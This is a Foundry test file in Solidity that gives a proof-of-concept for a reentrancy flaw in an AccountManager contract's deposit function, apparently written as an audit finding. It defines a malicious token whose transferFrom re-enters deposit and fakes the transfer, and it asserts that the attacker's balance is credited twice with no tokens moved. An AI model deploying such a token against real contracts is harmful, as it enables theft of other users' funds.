// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {IAccountManager} from "../../contracts/account-manager/IAccountManager.sol";
import {AccountManager} from "../../contracts/account-manager/AccountManager.sol";
import {OperatorRoles} from "../../contracts/utils/Operator.sol";
import "forge-std/console.sol";

/*
Vulnerability Explanation:
The `AccountManager.deposit` function is vulnerable to re-entrancy. It calls the `transferFrom`
function on an external token contract before updating the user's balance. A malicious token
can implement a `transferFrom` function that calls back into the `deposit` function. This
re-entrant call will credit the user's account a second time before the first deposit completes,
effectively doubling the credited amount for a single token transfer.

PoC Explanation:
This test demonstrates the re-entrancy vulnerability by creating a malicious token (`MalToken`)
that re-enters the `deposit` function.
1.  The `MalToken`'s `transferFrom` function, when called by `AccountManager`, immediately calls
    `AccountManager.deposit` again with the same parameters.
2.  The test initiates a single deposit of `100 ether` from an attacker's address.
3.  The re-entrant call causes the attacker's balance to be credited twice.
4.  The test asserts that the attacker's balance in `AccountManager` is `200 ether`, while the
    actual token balance of the `AccountManager` is 0, because the malicious `transferFrom`
    never actually transfers tokens.
5.  This proves that the attacker can inflate their balance and withdraw funds they never deposited.
*/

/*──────────────────────── Mock Contracts ────────────────────────*/

contract MalToken is ERC20 {
    bool reentered;
    IAccountManager public acctManager;

    constructor(address _acctManager) {
        acctManager = IAccountManager(_acctManager);
    }

    function name() public pure override returns (string memory) {
        return "Malicious Token";
    }

    function symbol() public pure override returns (string memory) {
        return "MAL";
    }

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (!reentered) {
            reentered = true;
            // Re-enter AccountManager to deposit AGAIN, doubling the credit.
            // This is the core of the re-entrancy attack.
            acctManager.deposit(from, address(this), amount);
        }
        // We don't perform the actual transfer, just return true to fool SafeTransferLib.
        // This makes the exploit even more damaging as no funds are moved from the attacker.
        return true;
    }
}

/*──────────────────────────── PoC ──────────────────────────────*/

/**
 * @title PoC for Re-Entrancy in AccountManager Deposit
 * @dev This test demonstrates that a malicious user can exploit a re-entrancy
 *      vulnerability in the `deposit` function to inflate their balance.
 *
 *      Rationale:
 *      The `deposit` function in `AccountManager` uses `safeTransferFrom`, which will
 *      call the token's `transferFrom` function. A malicious token can override this
 *      function to make a re-entrant call to `deposit`. Because the balance update
 *      occurs after the external call, the attacker's balance is credited twice.
 *      The PoC confirms this by checking that the internal balance is doubled while
 *      the contract's actual token holdings remain zero.
 */
contract PoCHighAccountManagerReentrancy is Test {
    AccountManager public acctManager;
    MalToken public malToken;
    address public attacker;

    function setUp() public {
        // --- Deploy a fresh AccountManager ---
        // In a real test suite, this might be handled by a base contract like RouterTestBase.
        // For this PoC, we deploy a minimal instance.
        acctManager = new AccountManager(
            address(this), // gteRouter (mock)
            address(this), // clobManager (mock)
            new uint16[](0), // spotMakerFees (empty)
            new uint16[](0) // spotTakerFees (empty)
        );
        // The constructor sets the owner, so an explicit initialize call is not needed.

        // --- Deploy the malicious token ---
        malToken = new MalToken(address(acctManager));

        // --- Set up the attacker ---
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether); // Give attacker some ETH for gas
        malToken.mint(attacker, 1_000_000 ether); // Mint plenty of MalToken for testing

        // --- Attacker approves the AccountManager to spend their MalToken ---
        vm.prank(attacker);
        malToken.approve(address(acctManager), type(uint256).max);

        // --- Grant MalToken contract the operator role to allow re-entrancy ---
        vm.prank(attacker);
        acctManager.approveOperator(
            address(malToken),
            1 << uint256(OperatorRoles.SPOT_DEPOSIT)
        );
    }

    function test_Reentrancy_InflateBalance() public {
        console.log("--- Test: Re-entrancy Deposit to Inflate Balance ---");
        uint256 depositAmount = 100 ether;

        // ── 1. Balances before the attack ────────────────────────────────
        uint256 attackerTokenBalBefore = malToken.balanceOf(attacker);
        uint256 contractTokenBalBefore = malToken.balanceOf(
            address(acctManager)
        );
        uint256 internalBalanceBefore = acctManager.getAccountBalance(
            attacker,
            address(malToken)
        );
        console.log("\nPart 1: Initial State Verification.");
        console.log("  Step 1.1: Balances before attack.");
        console.log("    - Attacker MalToken Balance:", attackerTokenBalBefore);
        console.log(
            "    - AccountManager MalToken Balance:",
            contractTokenBalBefore
        );
        console.log(
            "    - Attacker Internal Balance in AccountManager:",
            internalBalanceBefore
        );
        assertEq(
            contractTokenBalBefore,
            0,
            "Initial contract balance should be 0."
        );
        assertEq(
            internalBalanceBefore,
            0,
            "Initial internal balance should be 0."
        );

        // ── 2. Attacker triggers the re-entrant deposit ──────────────────
        console.log("\nPart 2: Executing the re-entrant deposit.");
        vm.prank(attacker);
        acctManager.deposit(attacker, address(malToken), depositAmount);
        console.log(
            "  Step 2.1: Attacker calls `deposit` with malicious token."
        );

        // ── 3. Verify the inflated balance ───────────────────────────────
        console.log("\nPart 3: Verifying the outcome of the attack.");
        uint256 internalBalanceAfter = acctManager.getAccountBalance(
            attacker,
            address(malToken)
        );
        uint256 contractTokenBalAfter = malToken.balanceOf(
            address(acctManager)
        );
        console.log("  Step 3.1: Balances after attack.");
        console.log(
            "    - Attacker Internal Balance in AccountManager:",
            internalBalanceAfter
        );
        console.log(
            "    - AccountManager MalToken Balance:",
            contractTokenBalAfter
        );

        // Assert: Internal balance is credited twice (200 ether) due to re-entrancy.
        assertEq(
            internalBalanceAfter,
            2 * depositAmount,
            "FAIL: Internal balance was not inflated to double the deposit amount."
        );
        console.log(
            "  >> Verification 1: Internal balance successfully inflated."
        );

        // Assert: Actual tokens held by the contract is 0, because the malicious
        // `transferFrom` never actually moved any tokens.
        assertEq(
            contractTokenBalAfter,
            0,
            "FAIL: Tokens were unexpectedly transferred to the contract."
        );
        console.log(
            "  >> Verification 2: No tokens were actually transferred. Exploit confirmed."
        );

        // ── 4. (Optional) Attacker withdraws the inflated balance ────────
        // This step demonstrates the financial impact. In a real scenario with a vulnerable
        // token that *does* transfer, the contract would have `depositAmount` tokens but
        // would be liable for `2 * depositAmount`, allowing the attacker to drain other users' funds.
        // With our non-transferring token, this withdraw would fail if the contract has no tokens to send.
        // The key vulnerability is the balance inflation itself.
        console.log("\nPart 4: Demonstrating potential for withdrawal.");
        vm.expectRevert(); // Expect revert because contract has 0 tokens to send.
        vm.prank(attacker);
        acctManager.withdraw(attacker, address(malToken), 2 * depositAmount);
        console.log(
            "  >> Verification 3: Withdrawal of inflated balance is possible if contract holds tokens, but reverts here as expected because it holds none."
        );
    }
}
